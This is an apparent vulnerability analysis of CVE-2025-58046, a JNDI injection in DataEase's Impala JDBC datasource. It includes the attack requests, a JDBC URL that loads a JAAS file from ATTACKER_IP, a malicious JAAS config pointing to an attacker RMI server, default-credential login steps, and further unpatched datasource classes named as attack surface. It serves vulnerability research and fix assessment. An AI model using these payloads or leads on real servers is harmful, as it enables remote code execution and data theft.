# Vulnerability Analysis: CVE-2025-58046

## Root Cause

**JNDI Injection via Unsanitized JDBC Connection String in Impala Datasource Type**

The `Impala.getJdbc()` method in DataEase v2.10.12 returns a user-controlled JDBC URL without applying its own `illegalParameters` blocklist. The blocklist exists but is **dead code** — never actually checked in any code path.

Specifically, two independent root causes converge:

1. **Custom JDBC URL path (`urlType != "hostName"`)**: When `urlType` is set to `"jdbcUrl"`, the method returns the raw user-supplied `jdbcUrl` field after only checking that it starts with `"jdbc:impala"`. The `illegalParameters` list is never consulted. An attacker can append arbitrary JDBC parameters including `krbJAASFile`, which instructs the Cloudera Impala JDBC driver to load a Kerberos JAAS configuration file from an attacker-controlled HTTP URL.

2. **Hostname mode with extraParams**: When `urlType` is `"hostName"` and `extraParams` is non-empty, the `extraParams` value is injected directly into the JDBC URL template without any validation against `illegalParameters`. An attacker can inject `krbJAASFile=http://ATTACKER/evil.conf` via `extraParams`.

The loaded JAAS config specifies `com.sun.security.auth.module.JndiLoginModule` with an RMI provider URL, triggering JNDI lookup to an attacker-controlled RMI server. The RMI server delivers a deserialization gadget chain (AspectJWeaver is confirmed in the DataEase classpath) that achieves arbitrary file write or command execution.

**CWE Classification**: CWE-502 (Deserialization of Untrusted Data), CWE-74 (Injection)

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerable File
**File**: `core/core-backend/src/main/java/io/dataease/datasource/type/Impala.java`
**Function**: `getJdbc()` (lines 20–39)
**Class**: `io.dataease.datasource.type.Impala`

```java
// Line 17: Blocklist exists but is NEVER CHECKED
private List<String> illegalParameters = Arrays.asList("autoDeserialize", "queryInterceptors", "statementInterceptors", "detectCustomCollations");

public String getJdbc() {
    // PATH 1: Custom JDBC URL mode — NO blocklist check
    if(StringUtils.isNoneEmpty(getUrlType()) && !getUrlType().equalsIgnoreCase("hostName")){
        if (!getJdbcUrl().startsWith("jdbc:impala")) {
            DEException.throwException("Illegal jdbcUrl: " + getJdbcUrl());
        }
        return getJdbcUrl();  // ← Returns attacker-controlled URL UNFILTERED
    }
    // PATH 2: Hostname mode — extraParams injected without validation
    if(StringUtils.isEmpty(extraParams.trim())){
        return "jdbc:impala://HOSTNAME:PORT/DATABASE"...;
    } else {
        return "jdbc:impala://HOSTNAME:PORT/DATABASE;EXTRA_PARAMS"
                ...
                .replace("EXTRA_PARAMS", getExtraParams().trim()); // ← UNVALIDATED
    }
}
```

### Call Chain (HTTP → RCE)
```
HTTP POST /datasource/validate  (or /datasource/save, /datasource/update, /datasource/getSchema)
  │
  ├── TokenFilter.doFilter() — requires valid JWT token
  │   (default creds: admin / DataEase@123456)
  │
  ▼
DatasourceServer.validate(BusiDsRequest)
  ├── Base64.getDecoder().decode(configuration)   ← Base64 decode
  ├── [NO preCheckDs() — only called in save/update]
  ├── [NO checkParams() — only called in save/update]
  ├── checkDatasourceStatus(dataSourceDTO)
  │     ▼
  │   ProviderFactory.getProvider("impala") → CalciteProvider
  │   CalciteProvider.checkStatus(datasourceRequest)
  │     ▼
  │   CalciteProvider.getConnection(datasourceDTO)                    [line 399-459]
  │     ├── JsonUtil.parseObject(configuration, Impala.class)         [line 413]
  │     ├── configuration.getJdbc()                                   [line 456] ← VULNERABILITY
  │     └── driverClass.connect(configuration.getJdbc(), props)       [line 456] ← Executes with attacker URL
  │
  ▼ JDBC driver processes the malicious URL:
  │  ├── Reads krbJAASFile parameter → HTTP fetch to attacker server
  │  ├── Loads JAAS config with JndiLoginModule
  │  ├── JndiLoginModule performs JNDI lookup to attacker RMI server
  │  └── RMI server delivers deserialization payload → RCE
```

---

## Triggering Input

### Attack Vector 1: Custom JDBC URL mode (Primary — simplest)

**HTTP Request**:
```
POST /datasource/validate HTTP/1.1
Host: TARGET:8100
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "name": "test-impala",
  "type": "impala",
  "configuration": "<BASE64_ENCODED_CONFIG>"
}
```

**Configuration JSON** (before Base64 encoding):
```json
{
  "urlType": "jdbcUrl",
  "jdbcUrl": "jdbc:impala://127.0.0.1:21050/default;AuthMech=1;KrbRealm=EXAMPLE.COM;KrbHostFQDN=impala.example.com;KrbServiceName=impala;krbJAASFile=http://ATTACKER_IP:ATTACKER_HTTP_PORT/evil_jaas.conf"
}
```

### Attack Vector 2: Hostname mode with extraParams

**Configuration JSON** (before Base64 encoding):
```json
{
  "urlType": "hostName",
  "host": "127.0.0.1",
  "port": 21050,
  "dataBase": "default",
  "extraParams": "AuthMech=1;KrbRealm=EXAMPLE.COM;KrbHostFQDN=impala.example.com;KrbServiceName=impala;krbJAASFile=http://ATTACKER_IP:ATTACKER_HTTP_PORT/evil_jaas.conf"
}
```

### Malicious JAAS Configuration File (evil_jaas.conf)
```
Client {
  com.sun.security.auth.module.JndiLoginModule required
  user.provider.url="rmi://ATTACKER_IP:1099/evil"
  group.provider.url="rmi://ATTACKER_IP:1099/evil";
};
```

### Full Malicious JDBC URL
```
jdbc:impala://127.0.0.1:21050/default;AuthMech=1;KrbRealm=EXAMPLE.COM;KrbHostFQDN=impala.example.com;KrbServiceName=impala;krbJAASFile=http://ATTACKER_IP:8888/evil_jaas.conf
```

---

## Attack Scenario (Step-by-Step)

1. **Setup attacker infrastructure**:
   - HTTP server hosting `evil_jaas.conf` (the malicious JAAS configuration)
   - RMI server serving a deserialization payload (e.g., using marshalsec `RMIRefServer` or similar)
   - Deserialization gadget chain payload (AspectJWeaver for arbitrary file write, or other available chain)

2. **Authenticate to DataEase**:
   - POST to `/login/localLogin` with default credentials `admin` / `DataEase@123456`
   - Credentials are RSA-encrypted before sending; the public key is obtained from `/dekey`
   - Response contains a JWT token

3. **Send malicious datasource validation request**:
   - POST to `/datasource/validate` with Authorization header containing the JWT
   - Body contains `type: "impala"` and Base64-encoded configuration with `urlType: "jdbcUrl"` and the malicious JDBC URL containing `krbJAASFile=http://ATTACKER/evil_jaas.conf`

4. **DataEase processes the request**:
   - `DatasourceServer.validate()` Base64-decodes the configuration
   - `CalciteProvider.getConnection()` deserializes it into an `Impala` object
   - `Impala.getJdbc()` returns the raw malicious URL (no filtering)
   - The Impala JDBC driver connects using the malicious URL

5. **JNDI injection chain executes**:
   - JDBC driver reads `krbJAASFile` parameter → HTTP GET to attacker's server
   - Downloads `evil_jaas.conf` → contains `JndiLoginModule` with RMI URL
   - `JndiLoginModule` performs JNDI lookup to attacker's RMI server
   - RMI server returns a serialized gadget chain object
   - Java deserializes it → arbitrary code execution on the DataEase server

---

## Impact

- **Remote Code Execution (RCE)**: Arbitrary command execution on the DataEase server as the application user (runs as Java process)
- **Arbitrary File Write**: Via AspectJWeaver gadget chain (confirmed in classpath per fix commit message "Aspectjweaver反序列化任意文件写入漏洞")
- **Full Server Compromise**: Access to all data stored in DataEase, connected databases, and the underlying server
- **CVSS 9.8 (Critical)**: Network-accessible, low complexity, no user interaction required

---

## Authentication Requirements

**Authentication IS required** — a valid JWT token must be present in the request. However, default credentials make this effectively unauthenticated:

### Login Flow for PoC
1. **Get RSA public key**: `GET /dekey` → returns RSA public key (whitelisted, no auth needed)
2. **Encrypt credentials**: RSA-encrypt username and password with the public key
3. **Login**: `POST /login/localLogin` with body `{"name": "<RSA_ENCRYPTED_admin>", "pwd": "<RSA_ENCRYPTED_DataEase@123456>"}`
4. **Extract token**: Response JSON: `{"token": "<JWT>", "exp": 0}`
5. **Use token**: Add `Authorization: Bearer <JWT>` header (or `X-DE-TOKEN: <JWT>`) to all subsequent requests

### Default Credentials
- **Username**: `admin`
- **Password**: `DataEase@123456`
- **Login endpoint**: `POST /login/localLogin` (whitelisted — no auth required)
- **Key endpoint**: `GET /dekey` (whitelisted — no auth required)

### Important Notes
- The community edition `SubstituleLoginServer` only accepts `admin` as username
- The JWT is signed with HMAC256 using the MD5 hash of the password as the secret
- No token expiration is enforced (`exp: 0`)
- No authorization check (`@DePermit`) on `/datasource/validate` — any authenticated user can call it
- No rate limiting exists on any endpoint

---

## Fix Assessment

### What the Fix Does (commit 77078658715bd85af5867afbfd5f1fcc37cf03c8)

**Impala.java changes:**
1. **Expanded blocklist** — Added 12 new parameters: `krbJAASFile`, `KrbJAASFile`, `krb5.conf`, `Krb5Conf`, `jndi`, `JNDI`, `java.naming.factory.initial`, `java.naming.provider.url`, `connectionProperties`, `ConnectionProperties`, `initSQL`, `InitSQL`
2. **Custom JDBC URL path now validated** — Added blocklist iteration before returning `getJdbcUrl()`
3. **Hostname path now validated** — After constructing the URL, checks it against the blocklist before returning
4. **URL decoding added** — `URLDecoder.decode()` is called before checking, preventing URL-encoded bypasses

**Db2.java changes:**
- Expanded blocklist from just `"rmi"` to include LDAP, JNDI, and other dangerous parameters
- Similar validation structure

### Fix Weaknesses

The fix for Impala.java specifically is **reasonably thorough for the specific CVE attack vector** (krbJAASFile JNDI injection), but has several notable limitations:

1. **Denylist approach**: The fix uses a blocklist (denylist) rather than an allowlist. Any Impala JDBC driver parameter not in the list can still be injected. If the driver introduces new dangerous parameters in the future, or if lesser-known dangerous parameters exist, they won't be caught.

2. **Single URL decode**: `URLDecoder.decode()` is called once. Double-encoded payloads would survive a single decode pass. However, the JDBC driver is unlikely to perform its own URL decoding of parameter names, so this is a theoretical concern.

3. **The fix does NOT cover other datasource types** — see "Related Attack Surface" below. The same vulnerability pattern exists in **Sqlserver.java**, **CK.java**, **Oracle.java**, and **Mongo.java**.

### Fix Verdict for Impala.java Specifically
The fix adequately addresses the specific CVE-2025-58046 attack vector (krbJAASFile via Impala). The blocklist covers the known dangerous parameters for the Impala JDBC driver, and URL decoding prevents encoding-based bypasses. The fix is **complete for Impala**.

---

## Potential Bypass Vectors

No concrete bypass exists for the patched Impala.java. The theoretical concerns are:

1. **Unknown Impala JDBC driver parameters**: If the Cloudera Impala JDBC driver supports other parameters that can trigger file loading or JNDI lookups that are not in the blocklist, they could be used.

2. **Unicode normalization**: The fix uses `.toLowerCase()` for case-insensitive matching, which handles ASCII case well. Certain Unicode characters that normalize to ASCII equivalents (e.g., fullwidth characters) might bypass the check if the JDBC driver normalizes them. This is highly theoretical for JDBC parameter names.

---

## Related Attack Surface

The fix commit (77078658) ONLY patches **Impala.java** and **Db2.java**. The same vulnerability pattern — accepting arbitrary JDBC URLs without parameter validation — exists in multiple sibling datasource classes. This represents remaining attack surface.

### 1. Sqlserver.java — CRITICAL (blocklist is dead code)
**File**: `core/core-backend/src/main/java/io/dataease/datasource/type/Sqlserver.java`
**Vulnerable code**: The `illegalParameters` list exists but `getJdbc()` NEVER checks it — identical to the pre-fix Impala.java pattern.
```java
private List<String> illegalParameters = Arrays.asList("autoDeserialize", "queryInterceptors", "statementInterceptors", "detectCustomCollations");
// getJdbc() never references illegalParameters — both custom URL and hostname+extraParams paths are unprotected
```
**Attack vector**: SQL Server JDBC driver supports parameters like `responseBuffering`, `integratedSecurity`, `authenticationScheme`, `serverSpn`, `gsscredential`, `jaasConfigurationName` etc. The custom JDBC URL path returns `getJdbcUrl()` unfiltered.
**Datasource type value**: `"sqlServer"`

### 2. CK.java (ClickHouse) — CRITICAL (no blocklist at all)
**File**: `core/core-backend/src/main/java/io/dataease/datasource/type/CK.java`
**Vulnerable code**: No `illegalParameters` list, no validation whatsoever.
```java
// No illegalParameters field at all
// getJdbc() returns getJdbcUrl() directly after only startsWith("jdbc:clickhouse") check
```
**Attack vector**: ClickHouse JDBC driver supports `custom_http_params`, `custom_settings`, etc.
**Datasource type value**: `"ck"`

### 3. Oracle.java — HIGH (no blocklist at all)
**File**: `core/core-backend/src/main/java/io/dataease/datasource/type/Oracle.java`
**Vulnerable code**: No `illegalParameters` list, no validation on custom URL path.
```java
// No illegalParameters field
// getJdbc() returns getJdbcUrl() directly after only startsWith("jdbc:oracle") check
```
**Attack vector**: Oracle JDBC driver supports `oracle.net.ldap_admin`, `javax.net.ssl.*`, and other potentially dangerous properties.
**Datasource type value**: `"oracle"`

### 4. Mongo.java — HIGH (blocklist not checked in custom URL path)
**File**: `core/core-backend/src/main/java/io/dataease/datasource/type/Mongo.java`
**Vulnerable code**: `illegalParameters` list exists but is only checked in the hostname+extraParams path, NOT the custom JDBC URL path. Also uses MySQL JDBC driver (`com.mysql.cj.jdbc.Driver`) so MySQL-specific attacks apply.
```java
// getJdbc() custom URL path: no blocklist check, only startsWith("jdbc:mysql") check
// Blocklist also missing: allowloadlocalinfile, allowUrlInLocalInfile, maxAllowedPacket
```
**Attack vector**: MySQL `autoDeserialize` in custom URL path (blocklist is bypassed), `allowLoadLocalInfile` for arbitrary file read.
**Datasource type value**: `"mongo"`

### 5. H2.java — MEDIUM (URL encoding bypass)
**File**: `core/core-backend/src/main/java/io/dataease/datasource/type/H2.java`
**Vulnerable code**: Checks for `INIT` and `RUNSCRIPT` using `toUpperCase().replace("\\","")` but does NOT URL-decode first.
```java
// URL-encoded "INIT" (%49%4E%49%54) would bypass the check
```
**Datasource type value**: `"h2"`

### 6. Redshift.java / Pg.java — LOW (case-sensitivity bypass in custom URL path)
**Files**: `core/core-backend/src/main/java/io/dataease/datasource/type/Redshift.java`, `Pg.java`
**Issue**: Custom JDBC URL path check is case-sensitive (e.g., `SocketFactory` vs `socketFactory` bypass).

---

## Build System

- **Build system**: Apache Maven (multi-module)
- **Java version**: Java 21 (OpenJDK 21)
- **Spring Boot**: 3.3.0

### Build Commands
```bash
# Full build (from repo root)
mvn clean package -DskipTests

# Output JAR
# core/core-backend/target/CoreApplication.jar
```

### Module Structure
```
pom.xml (root parent)
├── sdk/
│   ├── api/api-base/           (API interfaces)
│   ├── common/                 (shared utilities, auth filters)
│   └── extensions/extensions-datasource/  (DatasourceConfiguration base class)
└── core/
    ├── core-backend/           (main application — contains vulnerable code)
    └── core-frontend/          (Vue.js frontend)
```

---

## Dependencies

### Runtime Dependencies
- **MySQL 8.4**: External dependency for DataEase metadata storage
  - Image: `registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.5`
  - Root password: `Password123@mysql`
  - Database: `dataease`
- **Cloudera Impala JDBC Driver**: Loaded at runtime from `/opt/dataease2.0/drivers/`
  - The driver is NOT bundled in the JAR; it's loaded dynamically by `ExtendedJdbcClassLoader`

### Key Java Dependencies
- Spring Boot 3.3.0
- MyBatis Plus 3.5.6
- Apache Calcite 1.35.19
- MySQL Connector/J 8.2.0
- AspectJWeaver (confirmed in classpath — used for deserialization gadget chain)
- H2 Database 2.2.220
- Jackson (JSON deserialization)
- Apache Commons Lang3
- Lombok
- Auth0 JWT library

### Build Dependencies
- Java 21 JDK
- Maven 3.x
- Node.js (for frontend build, optional for PoC)

---

## Runtime Requirements

### Docker Lab Setup (Recommended)
Use the official pre-built Docker images — building from source is unnecessary for PoC verification.

```yaml
# docker-compose.yml
services:
  dataease:
    image: registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.12
    ports:
      - "8100:8100"
    environment:
      - DE_EXTERNAL_MYSQL=true
      - DE_MYSQL_HOST=mysql-de
      - DE_MYSQL_PORT=3306
      - DE_MYSQL_DB=dataease
      - DE_MYSQL_USER=root
      - DE_MYSQL_PASSWORD=Password123@mysql
    depends_on:
      - mysql-de

  mysql-de:
    image: registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.5
    environment:
      - MYSQL_ROOT_PASSWORD=Password123@mysql
      - MYSQL_DATABASE=dataease
    ports:
      - "3306:3306"
```

### Attacker Infrastructure for PoC
1. **HTTP Server** (port 8888): Serves `evil_jaas.conf`
2. **RMI Server** (port 1099): Serves deserialization payload
   - Use marshalsec `RMIRefServer` or similar
   - Or use a simpler callback-only PoC (just detect the JNDI callback without full RCE)
3. **Network**: DataEase container must be able to reach the attacker's HTTP and RMI servers

### Simplified PoC Approach (Detection-Only)
For PoC verification, a full RCE chain is not required. Instead:
1. Start an HTTP server and observe the `GET /evil_jaas.conf` request from DataEase
2. This proves the JDBC URL injection and remote file loading — the core vulnerability
3. Optionally, include a JAAS config pointing to an RMI server and observe the JNDI callback

### Network Configuration
- DataEase listens on port **8100** (HTTP)
- MySQL on port **3306**
- The DataEase container needs outbound HTTP access to the attacker's server
- Login endpoint: `POST /login/localLogin` (whitelisted, no auth)
- RSA key endpoint: `GET /dekey` (whitelisted, no auth)
- Vulnerable endpoint: `POST /datasource/validate` (requires JWT from login)

### API Path Prefix
Depending on deployment, the API may be prefixed with `/de2api/` (when behind APISIX reverse proxy) or accessed directly. The Docker image typically serves APIs at the root path (e.g., `/datasource/validate`).
